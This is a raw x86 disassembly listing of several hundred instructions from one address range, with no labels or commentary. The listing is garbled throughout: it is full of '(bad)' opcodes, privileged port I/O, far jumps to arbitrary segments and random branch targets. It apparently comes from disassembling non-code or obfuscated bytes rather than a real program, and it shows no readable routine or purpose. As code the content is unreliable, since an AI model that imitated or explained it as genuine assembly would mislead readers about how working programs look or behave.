  420426:	jmp    0xd9af28cd
  42042b:	and    bh,BYTE PTR [ebp+ecx*4+0x53]
  42042f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420430:	add    BYTE PTR [eax],ch
  420432:	mov    al,BYTE PTR [ebp-0x23603419]
  420438:	test   BYTE PTR ds:0x89e22616,dl
  42043e:	cld    
  42043f:	inc    ecx
  420440:	clc    
  420441:	push   ds
  420442:	out    dx,al
  420443:	(bad)  
  420444:	inc    edi
  420445:	ja     0x420413
  420447:	mov    fs,WORD PTR [edi-0x4e265be8]
  42044d:	stc    
  42044e:	pop    ss
  42044f:	add    BYTE PTR [edx],0x3d
  420452:	fisttp DWORD PTR [ebx]
  420454:	add    ebx,DWORD PTR [edi+0x73]
  420457:	retf   
  420458:	outs   dx,DWORD PTR ds:[esi]
  420459:	mov    ds:0xe6f17ff5,eax
  42045e:	push   edi
  42045f:	mov    al,ds:0x55682b36
  420464:	loop   0x420402
  420466:	lds    eax,FWORD PTR [ecx+0x23]
  420469:	sbb    DWORD PTR [ebx-0x52],esp
  42046c:	xchg   esp,eax
  42046d:	sub    eax,0x7132e0c
  420472:	mov    ds:0xdbed3133,al
  420477:	lods   al,BYTE PTR ds:[esi]
  420478:	add    eax,0x174b9dc1
  42047d:	cwde   
  42047e:	xchg   ecx,eax
  42047f:	shl    dl,0x71
  420482:	push   ebx
  420483:	or     DWORD PTR [ecx+edi*8+0x29],esi
  420487:	(bad)  
  420488:	inc    ebx
  420489:	sub    al,0x24
  42048b:	loop   0x420426
  42048d:	xor    BYTE PTR [edx+0x289288f1],al
  420493:	out    dx,al
  420494:	push   ebx
  420495:	jne    0x420514
  420497:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420498:	pop    edi
  420499:	or     eax,0x959b77b5
  42049e:	fucomp st(7)
  4204a0:	sbb    eax,0x5c72a0d4
  4204a5:	xchg   edx,eax
  4204a6:	icebp  
  4204a7:	sbb    al,0x1e
  4204a9:	cmp    ebp,DWORD PTR [edx-0x72]
  4204ac:	std    
  4204ad:	sbb    dl,bh
  4204af:	and    DWORD PTR [ecx+0x27],eax
  4204b2:	jo     0x42045b
  4204b4:	lahf   
  4204b5:	popf   
  4204b6:	xor    ebx,esp
  4204b8:	push   esp
  4204b9:	adc    edx,esi
  4204bb:	(bad)  
  4204bc:	xor    BYTE PTR [esp+esi*2-0x2fc25aaf],bh
  4204c3:	pop    ss
  4204c4:	in     eax,dx
  4204c5:	add    ecx,edi
  4204c7:	lock pop edx
  4204c9:	sub    DWORD PTR [ecx-0x66],edi
  4204cc:	cld    
  4204cd:	call   0x3531:0x448cb377
  4204d4:	mov    bl,0x82
  4204d6:	pop    ebx
  4204d7:	out    0x23,eax
  4204d9:	dec    edi
  4204da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4204db:	outs   dx,DWORD PTR ds:[esi]
  4204dc:	fidivr DWORD PTR [ebx]
  4204de:	test   DWORD PTR [esi],ebx
  4204e0:	mov    eax,0xd1869f27
  4204e5:	stc    
  4204e6:	fld    DWORD PTR [eax+0x1e]
  4204e9:	mov    ecx,0x1cbf5434
  4204ee:	xchg   ebp,eax
  4204ef:	shl    BYTE PTR [edx+0x47],1
  4204f2:	(bad)  
  4204f3:	pop    ebp
  4204f4:	rol    BYTE PTR ds:0xe8a7212,cl
  4204fa:	mov    dl,0x83
  4204fc:	test   eax,0xf32d11d6
  420501:	cmp    cl,BYTE PTR [eax-0xf1568ad]
  420507:	jmp    0xacdeb0b9
  42050c:	gs in  al,0x35
  42050f:	outs   dx,DWORD PTR ds:[esi]
  420510:	fwait
  420511:	jl     0x420511
  420513:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420514:	or     DWORD PTR [edi],eax
  420516:	jo     0x4204c0
  420518:	leave  
  420519:	jns    0x420599
  42051b:	test   eax,0x3dcb9046
  420520:	adc    ebx,edi
  420522:	jecxz  0x42058f
  420524:	popf   
  420525:	js     0x420517
  420527:	pop    ebp
  420528:	push   ecx
  420529:	sbb    edx,0xffffff98
  42052c:	push   ds
  42052d:	push   es
  42052e:	in     al,0x2e
  420530:	or     al,0x4d
  420532:	enter  0x8079,0x42
  420536:	jns    0x4205b4
  420538:	in     al,0xd3
  42053a:	addr16 xchg ebx,eax
  42053c:	daa    
  42053d:	es and al,0xca
  420540:	lds    esi,FWORD PTR [edx]
  420542:	mov    ah,0x55
  420544:	mov    DWORD PTR [ecx],0x356d0dcd
  42054a:	sub    al,BYTE PTR [edx]
  42054c:	pop    eax
  42054d:	xor    DWORD PTR [ecx+0x4d0ea9be],esp
  420553:	xor    al,0x38
  420555:	jmp    0xcf85:0xc03d7918
  42055c:	mov    ecx,0x75b63d22
  420561:	dec    eax
  420562:	sub    eax,0x40847a73
  420567:	mov    ebp,0x65335996
  42056c:	test   DWORD PTR [edi+0x11],esi
  42056f:	pop    esp
  420570:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420571:	sub    DWORD PTR [ebx],esp
  420573:	call   0xb39f:0xcbda6576
  42057a:	mov    dl,0x84
  42057c:	mov    ebx,0x768d0ffa
  420581:	std    
  420582:	ret    0x8f56
  420585:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420587:	sub    eax,eax
  420589:	sbb    ebp,DWORD PTR [edi]
  42058b:	cmp    eax,0xb4a0f9eb
  420590:	leave  
  420591:	aaa    
  420592:	push   cs
  420593:	jno    0x420544
  420595:	mov    bl,0x7a
  420597:	xor    ecx,DWORD PTR [ebx-0x618ab5ab]
  42059d:	ins    DWORD PTR es:[edi],dx
  42059e:	ins    BYTE PTR es:[edi],dx
  42059f:	out    dx,al
  4205a0:	jmp    0x4205b1
  4205a2:	and    bl,BYTE PTR [ebx-0x57937b1]
  4205a8:	xchg   BYTE PTR [esi-0x20],ch
  4205ab:	loope  0x4205d4
  4205ad:	add    al,0x70
  4205af:	hlt    
  4205b0:	test   BYTE PTR [esi-0x43],dl
  4205b3:	shl    ch,0x3a
  4205b6:	rol    DWORD PTR [ebx+0x4a0481e7],1
  4205bc:	sti    
  4205bd:	fld    QWORD PTR [ecx]
  4205bf:	inc    esi
  4205c0:	mov    ch,BYTE PTR [esi-0x55551402]
  4205c6:	inc    edi
  4205c7:	xchg   edi,eax
  4205c8:	inc    ecx
  4205c9:	push   0xcca2c877
  4205ce:	mov    esp,0x9459984f
  4205d3:	lea    eax,[edi]
  4205d5:	cmp    dl,BYTE PTR [esp+esi*4+0x3c64357a]
  4205dc:	cmc    
  4205dd:	xor    al,BYTE PTR [ecx+eax*4]
  4205e0:	cwde   
  4205e1:	les    esi,FWORD PTR [esi+eax*4]
  4205e4:	loop   0x4205ff
  4205e6:	adc    al,0x84
  4205e8:	mov    eax,0x275011ae
  4205ed:	js     0x4205f7
  4205ef:	mov    ebp,0x3354ba70
  4205f4:	pop    ecx
  4205f5:	std    
  4205f6:	out    dx,al
  4205f7:	cmp    edi,DWORD PTR [ebx+0x7a]
  4205fa:	add    DWORD PTR [edx+0x2b067e58],esi
  420600:	out    0x4d,al
  420602:	mov    DWORD PTR [eax+0x56a34c9f],0x318c6fb9
  42060c:	dec    esp
  42060d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42060e:	shl    BYTE PTR [ecx-0x18],cl
  420611:	rcl    BYTE PTR [esi+0x38b1d5cf],0x4d
  420618:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420619:	ds adc ebx,esp
  42061c:	or     DWORD PTR [edi+0x56],edi
  42061f:	push   0x58
  420621:	fistp  QWORD PTR [edi]
  420623:	cwde   
  420624:	and    ch,BYTE PTR [eax]
  420626:	mov    ebx,DWORD PTR [eax+0x57]
  420629:	jnp    0x4206a2
  42062b:	add    BYTE PTR [eax],bh
  42062d:	push   0x7fcac5ce
  420632:	clc    
  420633:	mov    dl,0x2b
  420635:	jl     0x42068a
  420637:	dec    ecx
  420638:	icebp  
  420639:	sbb    DWORD PTR [esi+0x22],edi
  42063c:	leave  
  42063d:	mov    dh,0xa8
  42063f:	nop
  420640:	repnz mov WORD PTR [ebp-0x713f2922],?
  420647:	cld    
  420648:	mov    ebp,0xd0e4fc8a
  42064d:	add    eax,0xc9016491
  420652:	xor    al,0x3d
  420654:	sub    BYTE PTR [eax+0xa07aa3e],0x48
  42065b:	repz (bad) 
  42065d:	fimul  WORD PTR [ecx+0x9]
  420660:	(bad)  
  420661:	rcr    BYTE PTR ss:[edi+0x2a258cb1],cl
  420668:	mov    WORD PTR [edi+0x3f],?
  42066b:	test   BYTE PTR [ecx],0xeb
  42066e:	jmp    0x4206d9
  420670:	ss pop ebp
  420672:	jae    0x420634
  420674:	dec    ebp
  420675:	bound  ebp,QWORD PTR [ebx-0x39851c03]
  42067b:	bound  edx,QWORD PTR [edi-0x760987fd]
  420681:	fs push 0xcc19f060
  420687:	sbb    eax,0x896765cb
  42068c:	sub    ch,cl
  42068e:	cli    
  42068f:	fst    QWORD PTR [edi]
  420691:	sub    eax,ebx
  420693:	push   edi
  420694:	in     eax,dx
  420695:	dec    ebp
  420696:	call   DWORD PTR [esi+0x5bd1a4da]
  42069c:	imul   edx,esp,0x24
  42069f:	cmc    
  4206a0:	outs   dx,BYTE PTR ds:[esi]
  4206a1:	mov    ds:0xed52bd25,al
  4206a6:	jns    0x42065e
  4206a8:	cs jbe 0x4206e9
  4206ab:	cmp    DWORD PTR [esi+0x78],edi
  4206ae:	xchg   esp,eax
  4206af:	inc    esi
  4206b0:	jmp    0xaed3e64f
  4206b5:	(bad)  
  4206b6:	sub    al,0x76
  4206b8:	out    dx,al
  4206b9:	xchg   edx,eax
  4206ba:	leave  
  4206bb:	jl     0x4206b3
  4206bd:	cmp    ebp,DWORD PTR [edx+ebx*2+0x7a664ceb]
  4206c4:	inc    eax
  4206c5:	mul    ch
  4206c7:	add    esi,DWORD PTR [ecx+0x4ca21759]
  4206cd:	mov    ah,0x8
  4206cf:	fild   QWORD PTR [eiz*4-0x24b17642]
  4206d6:	aad    0xb8
  4206d8:	add    al,0x9a
  4206da:	dec    eax
  4206db:	es in  al,dx
  4206dd:	mov    bl,0x4e
  4206df:	in     al,0xe2
  4206e1:	inc    esp
  4206e2:	xchg   edx,eax
  4206e3:	retf   
  4206e4:	add    eax,0x6fb2fee9
  4206e9:	(bad)  
  4206ea:	dec    edi
  4206eb:	lods   eax,DWORD PTR ds:[esi]
  4206ec:	mov    esi,0xb99405f8
  4206f1:	pushf  
  4206f2:	ret    0xe493
  4206f5:	mov    edi,0xe3b33987
  4206fa:	(bad)  
  4206fb:	jp     0x420709
  4206fd:	cmp    cl,ah
  4206ff:	imul   ebx,ebp,0x67cb7be2
  420705:	imul   edx,DWORD PTR [ecx-0x4368317f],0xffffffa7
  42070c:	mov    dl,0x19
  42070e:	stc    
  42070f:	mov    bl,0xdb
  420711:	inc    ebx
  420712:	sub    DWORD PTR [edx-0x7d],ebp
  420715:	imul   edi,DWORD PTR [ebx-0x275309c0],0x69
  42071c:	ja     0x420758
  42071e:	mov    esi,0x4d939045
  420723:	rdtsc  
  420725:	adc    BYTE PTR [eax-0x19],ah
  420728:	das    
  420729:	popa   
  42072a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42072b:	daa    
  42072c:	fdivp  st(2),st
  42072e:	xchg   edi,eax
  42072f:	mov    ah,0x60
  420731:	int    0x93
  420733:	push   eax
  420734:	mov    cl,0xa0
  420736:	cs pop edi
  420738:	rcr    DWORD PTR [edi-0x76e27a54],1
  42073e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42073f:	sub    al,0x35
  420741:	int3   
  420742:	push   ds
  420743:	cmp    edx,DWORD PTR [edx+0x55]
  420746:	rcr    DWORD PTR [ebx+ebp*1-0x7a],0x15
  42074b:	lahf   
  42074c:	inc    ebp
  42074d:	cmp    DWORD PTR ds:0x63281f12,0x68
  420754:	dec    edx
  420755:	cmp    BYTE PTR [ecx+0x251d99a6],al
  42075b:	xlat   BYTE PTR ds:[ebx]
  42075c:	popa   
  42075d:	arpl   WORD PTR [ebx+0x45acf727],sp
  420763:	popf   
  420764:	clc    
  420765:	jl     0x4207ca
  420767:	leave  
  420768:	lds    ebx,FWORD PTR [ebx-0x50]
  42076b:	imul   esi,DWORD PTR [edi-0x70],0x6a
  42076f:	and    DWORD PTR [esi-0x25],0x8a49ddca
  420776:	stos   BYTE PTR es:[edi],al
  420777:	enter  0xde4c,0xd8
  42077b:	fisttp QWORD PTR [ecx-0x79]
  42077e:	sbb    DWORD PTR [ecx-0x24ceeec9],ebp
  420784:	clc    
  420785:	mov    edx,0x42e57f67
  42078a:	inc    esi
  42078b:	xchg   BYTE PTR [ecx+0x1ef96bd9],dh
  420791:	mov    esi,0x43714211
  420796:	jp     0x420737
  420798:	adc    edi,DWORD PTR [esi]
  42079a:	and    DWORD PTR [edi],edx
  42079c:	sub    BYTE PTR [ebp+0x1a68a48],ah
  4207a2:	push   ebx
  4207a3:	cmc    
  4207a4:	mov    bh,0x90
  4207a6:	mov    ?,WORD PTR [ecx+0xe]
  4207a9:	loop   0x4207b5
  4207ab:	jbe    0x4207d5
  4207ad:	jecxz  0x420768
  4207af:	les    edx,FWORD PTR [ebx-0x3]
  4207b2:	sbb    al,0xfd
  4207b4:	mov    BYTE PTR [ecx-0x37],dh
  4207b7:	faddp  st(2),st
  4207b9:	ret    
  4207ba:	into   
  4207bb:	add    BYTE PTR [esi-0x7cc53852],ah
  4207c1:	cmp    al,0xa8
  4207c3:	pop    ebp
  4207c4:	mov    bl,0x78
  4207c6:	dec    ebx
  4207c7:	ds and al,0x6f
  4207ca:	jl     0x4207d7
  4207cc:	push   ebp
  4207cd:	iretw  
  4207cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4207d0:	pop    edi
  4207d1:	sub    dl,al
  4207d3:	out    dx,al
  4207d4:	fsubr  st(2),st
  4207d6:	sbb    DWORD PTR [edx+edx*4+0x522a1ec4],esp
  4207dd:	jp     0x42078a
  4207df:	imul   edx,DWORD PTR [edi],0xfffffff1
  4207e2:	in     al,dx
  4207e3:	outs   dx,BYTE PTR ds:[esi]
  4207e4:	in     al,dx
  4207e5:	mov    al,ds:0x6955236b
  4207ea:	mov    al,ds:0x9e6e10d9
  4207ef:	xchg   esi,eax
  4207f0:	loope  0x4207a1
  4207f2:	arpl   WORD PTR [esi-0x57],ax
  4207f5:	and    BYTE PTR [eax-0x280ebc98],cl
  4207fb:	dec    ecx
  4207fc:	and    edi,esp
  4207fe:	and    DWORD PTR [esp+ebp*1-0x7e],0x9
  420803:	pop    ds
  420804:	push   esp
  420805:	and    esi,DWORD PTR [edx+ecx*8+0x7c51d32]
  42080c:	cmp    BYTE PTR [ebx],dl
  42080e:	xchg   ebp,eax
  42080f:	cmp    ebx,DWORD PTR [edx]
  420811:	scas   eax,DWORD PTR es:[edi]
  420812:	xor    DWORD PTR [edi+0x7b],edx
  420815:	and    al,0xfb
  420817:	sbb    DWORD PTR [eax-0x1b],0xa21492db
  42081e:	inc    ecx
  42081f:	lock fsub QWORD PTR [eax+0x72]
  420823:	add    al,0x99
  420825:	in     al,0xa
  420827:	dec    eax
  420828:	cli    
  420829:	push   esp
  42082a:	stos   BYTE PTR es:[edi],al
  42082b:	sti    
  42082c:	dec    esp
  42082d:	sub    DWORD PTR [edx+0x2c891e7b],0x12
  420834:	bound  eax,QWORD PTR [eax]
  420836:	adc    dh,BYTE PTR [esp+esi*8-0x17ef0cc]
  42083d:	jbe    0x420861
  42083f:	es jmp 0xe0fcb57d
  420845:	sbb    DWORD PTR [ebx+0x4c],edx
  420848:	fdiv   DWORD PTR [ebx]
  42084a:	std    
  42084b:	xor    ecx,DWORD PTR ds:0xc24128cb
  420851:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420852:	idiv   BYTE PTR [edi]
  420854:	inc    eax
  420855:	ins    BYTE PTR es:[edi],dx
  420856:	ret    
  420857:	cmp    esp,DWORD PTR [eax]
  420859:	or     al,BYTE PTR [edx+0x29833c65]
  42085f:	je     0x420892
  420861:	into   
  420862:	adc    DWORD PTR [edx+ebx*8+0x78],esi
  420866:	js     0x420825
  420868:	lods   al,BYTE PTR ds:[esi]
  420869:	and    eax,0xe5d972a9
  42086e:	push   esp
  42086f:	and    al,BYTE PTR [ebx-0x7a]
  420872:	and    DWORD PTR [edi+0xf],edi
  420875:	jl     0x420800
  420877:	sbb    BYTE PTR [ebx+0x77],0x4d
  42087b:	jle    0x420846
  42087d:	fnsave [ebp+ecx*1-0x3e2a81f8]
  420884:	sub    bh,BYTE PTR [ebx]
  420886:	mov    edx,0x2eec381c
  42088b:	retf   
  42088c:	mov    ecx,ss
  42088e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42088f:	mov    cl,0x17
  420891:	repz dec ebx
  420893:	call   0x548c4ad9
  420898:	sbb    dl,ah
  42089a:	push   ss
  42089b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42089c:	adc    al,BYTE PTR [ecx-0x777725ff]
  4208a2:	bound  esp,QWORD PTR [ebx]
  4208a4:	pop    ecx
  4208a5:	fmul   st(4),st
  4208a7:	push   ss
  4208a8:	in     eax,dx
  4208a9:	imul   ecx,DWORD PTR [eax],0xffffffe8
  4208ac:	mov    ds:0x7e5869f,al
  4208b1:	xlat   BYTE PTR ds:[ebx]
  4208b2:	std    
  4208b3:	(bad)  
  4208b5:	and    al,0x16
  4208b7:	cmp    DWORD PTR [ebx-0x19],eax
  4208ba:	(bad)
  4208bf:	aas    
  4208c0:	push   eax
  4208c1:	mov    eax,0x8c289037
  4208c6:	sahf   
  4208c7:	ja     0x4208ea
  4208c9:	dec    edi
  4208ca:	or     esi,DWORD PTR [ebp-0x4f]
  4208cd:	icebp  
  4208ce:	pop    ecx
  4208cf:	lods   eax,DWORD PTR ds:[esi]
  4208d0:	dec    ebp
  4208d1:	daa    
  4208d2:	inc    edx
  4208d3:	mov    BYTE PTR [edx-0x28c4d52c],0xea
  4208da:	push   edx
  4208db:	nop
  4208dc:	pop    edx
  4208dd:	pop    esi
  4208de:	adc    ebp,ebx
  4208e0:	mov    cl,0xa7
  4208e2:	push   es
  4208e3:	leave  
  4208e4:	les    esp,FWORD PTR [edx+0x4cb1a6b7]
  4208ea:	inc    ebp
  4208eb:	ds sbb eax,0x16d20b34
  4208f1:	xchg   esp,eax
  4208f2:	mov    ebx,0x498aa302
  4208f7:	push   edx
  4208f8:	jl     0x42092e
  4208fa:	sbb    eax,0xb048fe7
  4208ff:	ins    DWORD PTR es:[edi],dx
  420900:	js     0x420899
  420902:	rcl    DWORD PTR [ecx+ebp*1],0xad
  420906:	push   edx
  420907:	lahf   
  420908:	fwait
  420909:	inc    BYTE PTR ds:0xf9f9d36b
  42090f:	jnp    0x42089c
  420911:	mov    bl,0x55
  420913:	fs push ebx
  420915:	jno    0x420988
  420917:	test   BYTE PTR [esi-0x26],cl
  42091a:	pushf  
  42091b:	not    ch
  42091d:	xchg   esi,eax
  42091e:	push   esi
  42091f:	or     BYTE PTR [eax+0x20],cl
  420922:	inc    ebp
  420923:	cmp    eax,DWORD PTR [eax-0x9]
  420926:	mov    bh,0x5f
  420928:	sbb    BYTE PTR [eax],ch
  42092a:	xlat   BYTE PTR ds:[ebx]
  42092b:	inc    eax
  42092c:	pop    esi
  42092d:	add    bl,ah
  42092f:	int3   
  420930:	call   0x11:0x6d5ddebb
  420937:	and    DWORD PTR ss:[edx],ecx
  42093a:	test   BYTE PTR [edi],al
  42093c:	cdq    
  42093d:	nop
  42093e:	cld    
  42093f:	jp     0x420914
  420941:	fbstp  TBYTE PTR [esi]
  420943:	push   cs
  420944:	jnp    0x4209b6
  420946:	(bad)  
  420948:	add    al,0xde
  42094a:	jecxz  0x42090b
  42094c:	adc    eax,0xff509614
  420951:	and    bh,BYTE PTR [edi-0x26]
  420954:	cmp    bl,BYTE PTR [edx-0x7c]
  420957:	and    eax,0xc23a3d9
  42095c:	mov    dh,0x5a
  42095e:	or     al,BYTE PTR [edi-0x4f]
  420961:	test   BYTE PTR [edx+0x6ae5f274],ah
  420967:	jle    0x420951
  420969:	shr    BYTE PTR [esp+ebx*1+0x1a],1
  42096d:	mov    eax,ds:0x752f0a8a
  420972:	mov    ecx,0x9679d833
  420977:	cmp    eax,0xefc69395
  42097c:	xor    eax,0x11f79493
  420981:	outs   dx,BYTE PTR ds:[esi]
  420982:	mov    edx,DWORD PTR [eax+0x48]
  420985:	mov    eax,edx
  420987:	(bad)  
  420988:	fstp   QWORD PTR [ebp-0x402fdf2a]
  42098e:	pushf  
  42098f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420990:	lods   eax,DWORD PTR ds:[esi]
  420991:	jo     0x4209ae
  420993:	or     esp,DWORD PTR [esi]
  420995:	je     0x4209c8
  420997:	push   ebx
  420998:	cmc    
  420999:	(bad)  
  42099a:	int    0xe8
  42099c:	add    BYTE PTR [edi],al
  42099e:	fsub   DWORD PTR [ebp+0x33c89727]
  4209a4:	pop    ss
  4209a5:	std    
  4209a6:	jp     0x4209b3
  4209a8:	push   ds
  4209a9:	jl     0x4209f6
  4209ab:	push   edi
  4209ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209ad:	mov    bl,0xc5
  4209af:	push   edx
  4209b0:	out    dx,al
  4209b1:	pop    esp
  4209b2:	mov    ecx,0x4ce067e0
  4209b7:	retf   
  4209b8:	jl     0x4209bd
  4209ba:	xchg   ecx,eax
  4209bb:	and    al,0xeb
  4209bd:	imul   ecx,DWORD PTR [esi+0x7],0x13264f65
  4209c4:	pop    esi
  4209c5:	jle    0x4209f1
  4209c7:	fbld   TBYTE PTR [ebx+0x6f86cb18]
  4209cd:	mov    bh,0x5b
  4209cf:	inc    edi
  4209d0:	mov    es,WORD PTR [edi]
  4209d2:	fcmove st,st(5)
  4209d4:	hlt    
  4209d5:	push   esi
  4209d6:	adc    DWORD PTR [eax],esi
  4209d8:	mov    sp,0x48d1
  4209dc:	push   ebx
  4209dd:	push   esi
  4209de:	push   esi
  4209df:	lods   eax,DWORD PTR ds:[esi]
  4209e0:	dec    edx
  4209e1:	mov    al,ds:0x4ee90ce3
  4209e6:	mov    edi,DWORD PTR [eax]
  4209e8:	add    bl,BYTE PTR [ebp-0x789acfd1]
  4209ee:	scas   eax,DWORD PTR es:[edi]
  4209ef:	cmp    DWORD PTR [ebx+0x7c],ebx
  4209f2:	dec    edi
  4209f3:	test   BYTE PTR ds:0xf1756bbf,cl
  4209f9:	mov    eax,0x88c7bc8c
  4209fe:	sub    eax,edx
  420a00:	jne    0x420a5e
  420a02:	loop   0x420a3b
  420a04:	das    
  420a05:	loop   0x4209b3
  420a07:	int    0xf8
  420a09:	add    edi,DWORD PTR [esi-0x35]
  420a0c:	daa    
  420a0d:	pop    edx
  420a0e:	xchg   ecx,eax
  420a0f:	rcl    DWORD PTR [edi+eax*8+0x45],0x5c
  420a14:	scas   al,BYTE PTR es:[edi]
  420a15:	(bad)  
  420a17:	enter  0x801e,0x54
  420a1b:	jmp    0x7d59:0x88403053
  420a22:	mov    BYTE PTR [esi+0x7],0x12
  420a26:	add    DWORD PTR [esi-0x9f069f3],ebp
  420a2c:	or     al,0xe
  420a2e:	jl     0x420a6c
  420a30:	stos   BYTE PTR es:[edi],al
  420a31:	aad    0xe7
  420a33:	xchg   esp,eax
  420a34:	ficomp WORD PTR [edx]
  420a36:	mov    cs,WORD PTR [bx]
  420a39:	jno    0x4209ed
  420a3b:	mov    ch,0xc1
  420a3d:	mov    ebx,0x1aed4870
  420a42:	lahf   
  420a43:	push   ebp
  420a44:	xchg   esi,eax
  420a45:	cmp    eax,0xcaa1182a
  420a4a:	xor    BYTE PTR [bx+0x66f],bh
  420a4f:	jo     0x420a1b
  420a51:	mov    bh,0xd9
  420a53:	sahf   
  420a54:	shl    DWORD PTR [ecx+0x4f877de9],1
  420a5a:	bound  eax,QWORD PTR ds:0x4dcbdf2b
  420a60:	outs   dx,BYTE PTR ds:[esi]
  420a61:	push   0x79
  420a63:	inc    ebp
  420a64:	rcl    BYTE PTR [ebx+eax*4+0x7a],cl
  420a68:	mov    eax,ds:0x2ff0ecc0
  420a6d:	popf   
  420a6e:	inc    esp
  420a6f:	sahf   
  420a70:	jmp    0x64ed50c3
  420a75:	pop    edi
  420a76:	inc    edx
  420a77:	sti    
  420a78:	xor    DWORD PTR [ebx-0x5904d13],esp
  420a7e:	jmp    0xb4c62724
  420a83:	repnz and eax,0xc9641f8f
  420a89:	out    0x43,eax
  420a8b:	mov    al,0x25
  420a8d:	gs jmp 0x87e355f7
  420a93:	les    esp,FWORD PTR [eax]
  420a95:	xchg   DWORD PTR [esi-0x89b1e2a],ebp
  420a9b:	out    dx,eax
  420a9c:	bound  ecx,QWORD PTR [edx+0x2428357]
  420aa2:	push   ds
  420aa3:	xor    DWORD PTR [esi+0x36],0x2ff1995
  420aaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420aab:	jmp    0x420b0f
  420aad:	popf   
  420aae:	mov    DWORD PTR [ebp-0x7b328b31],esp
  420ab4:	shl    DWORD PTR [ebp-0x34],1
  420ab7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ab8:	out    dx,al
  420ab9:	stc    
  420aba:	mov    ch,0xc1
  420abc:	bound  edi,QWORD PTR [edx-0x1]
  420abf:	mov    ds:0x9efcaf47,eax
  420ac4:	(bad)  [eax+eax*4-0x30d0c3bb]
  420acb:	(bad)  
  420acc:	pusha  
  420acd:	imul   edi,esi,0xffffffe9
  420ad0:	iret   
  420ad1:	push   eax
  420ad2:	mov    esp,ds
  420ad4:	call   0xa1fe:0xcc61dfc9
  420adb:	sub    BYTE PTR [edi],cl
  420add:	leave  
  420ade:	push   ebx
  420adf:	add    eax,0xa14c8c28
  420ae4:	add    al,0x4f
  420ae6:	ret    
  420ae7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ae8:	push   edi
  420ae9:	fdivr  DWORD PTR [ebp-0x5cbccf30]
  420aef:	in     eax,dx
  420af0:	(bad)  
  420af1:	push   0x87a00b4b
  420af6:	into   
  420af7:	adc    eax,0xe145f4a1
  420afc:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  420afe:	not    DWORD PTR [esp+ebp*4-0x1e2c79fa]
  420b05:	mov    al,0x32
  420b07:	and    edx,DWORD PTR [esi]
  420b09:	inc    edi
  420b0a:	leave  
  420b0b:	xor    al,0x95
  420b0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b0e:	js     0x420b57
  420b10:	lods   al,BYTE PTR fs:[esi]
  420b12:	fsubr  DWORD PTR [esi]
  420b14:	les    ebx,FWORD PTR [eax+0x3b]
  420b17:	dec    esp
  420b18:	pop    esi
  420b19:	fucomip st,st(2)
  420b1b:	sbb    DWORD PTR [ecx+ecx*1-0x70],0x49e528f4
  420b23:	add    DWORD PTR [edx],ecx
  420b25:	push   eax
  420b26:	push   ds
  420b27:	adc    al,0x9a
  420b29:	jmp    0xbe0b:0xb945aab4
  420b30:	outs   dx,BYTE PTR ds:[esi]
  420b31:	sub    dh,ch
  420b33:	or     ch,BYTE PTR [ecx-0x6a]
  420b36:	xor    ebx,eax
  420b38:	xchg   BYTE PTR [edi-0x1e408414],bh
  420b3e:	jbe    0x420b99
  420b40:	std    
  420b41:	outs   dx,BYTE PTR ds:[esi]
  420b42:	cld    
  420b43:	sti    
  420b44:	and    BYTE PTR [ebx-0x39],ah
  420b47:	inc    edx
  420b48:	aas    
  420b49:	push   es
  420b4a:	mov    ds,esp
  420b4c:	or     DWORD PTR [edx],edx
  420b4e:	mov    BYTE PTR [edi+0x3],al
  420b51:	or     DWORD PTR [edx],esp
  420b53:	cmp    al,0x9b
  420b55:	dec    esp
  420b56:	adc    al,dh
  420b58:	ror    DWORD PTR [edx],0x93
  420b5b:	cmp    BYTE PTR [eax-0x10ae3401],bh
  420b61:	mov    ch,cl
  420b63:	add    edx,edi
  420b65:	cmp    esp,ebp
  420b67:	inc    esi
  420b68:	pop    edi
  420b69:	push   cs
  420b6a:	mov    BYTE PTR [eax+ecx*2],bh
  420b6d:	xor    ecx,0xfe77f25c
  420b73:	dec    esi
  420b74:	and    ch,al
  420b76:	xor    BYTE PTR [ecx],cl
  420b78:	jmp    0x8b761a26
  420b7d:	sub    eax,0xe8edcf78
  420b82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b83:	imul   ebp,eax,0xf2ebd798
  420b89:	ds jmp 0x8145:0x6d0b74bc
  420b91:	fiadd  DWORD PTR [ecx]
  420b93:	stos   BYTE PTR es:[edi],al
  420b94:	push   edx
  420b95:	jmp    0x420be4
  420b97:	jb     0x420c11
  420b99:	add    esi,edi
  420b9b:	cmc    
  420b9c:	mov    ds:0x540bf117,eax
  420ba1:	nop
  420ba2:	js     0x420bfd
  420ba4:	ror    BYTE PTR [edx+0x2b764a3f],0xee
  420bab:	(bad)  
  420bac:	cmc    
  420bad:	iret   
  420bae:	sbb    DWORD PTR [ebp-0x37],edx
  420bb1:	fld    TBYTE PTR [ecx]
  420bb3:	ds mov esp,0x6d25637b
  420bb9:	mov    edi,0xe7e6c718
  420bbe:	sbb    BYTE PTR [ecx+0x74],bl
  420bc1:	xchg   ecx,eax
  420bc2:	fnsave [eax-0x3c26048c]
  420bc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420bc9:	sub    al,0xf8
  420bcb:	scas   eax,DWORD PTR es:[edi]
  420bcc:	xor    al,0x6c
  420bce:	mov    dh,al
  420bd0:	and    eax,0x5540d6c
  420bd5:	das    
